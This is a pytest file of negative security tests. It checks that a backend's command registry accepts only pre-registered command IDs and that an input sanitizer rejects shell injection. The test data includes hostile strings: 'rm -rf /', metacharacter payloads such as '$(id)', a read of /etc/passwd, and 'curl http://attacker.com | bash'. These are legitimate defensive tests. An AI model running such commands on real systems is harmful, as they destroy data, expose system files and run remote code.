"""
Negative Security Tests for Command Injection Prevention (Requirements #6, #22, #24)

Verifies:
- Arbitrary command strings cannot be passed to the execution context
- Metacharacters (; && || $(id) `id` |) are rejected by security policy
- Only pre-registered SafeCommand objects are recognized
"""

import pytest
from backend.app.collectors.registry import get_safe_command
from backend.app.security.command_registry import CommandSecurityPolicy


def test_immutable_command_registry_contains_only_registered_ids():
    assert CommandSecurityPolicy.is_safe("system.uname") is True
    assert CommandSecurityPolicy.is_safe("network.ss_listening_ports") is True
    assert CommandSecurityPolicy.is_safe("arbitrary_command") is False
    assert CommandSecurityPolicy.is_safe("rm -rf /") is False


def test_rejection_of_shell_injection_patterns():
    injection_payloads = [
        "; id",
        "&& whoami",
        "$(id)",
        "`id`",
        "| id",
        "test\nid",
        "test\rid",
        "cat /etc/passwd > /tmp/pwned",
        "curl http://attacker.com | bash"
    ]
    for payload in injection_payloads:
        with pytest.raises(ValueError, match="Dangerous characters or shell injection"):
            CommandSecurityPolicy.sanitize_input(payload)


def test_command_args_are_immutable_arrays_not_raw_shells():
    for cmd in CommandSecurityPolicy.list_registered_commands():
        raw_cmd = get_safe_command(cmd["identifier"])
        assert raw_cmd is not None
        assert isinstance(raw_cmd.command_args, list)
        assert len(raw_cmd.command_args) > 0
        # Args must be pure string tokens, not shell pipelines
        assert not any(";" in arg or "|" in arg for arg in raw_cmd.command_args)
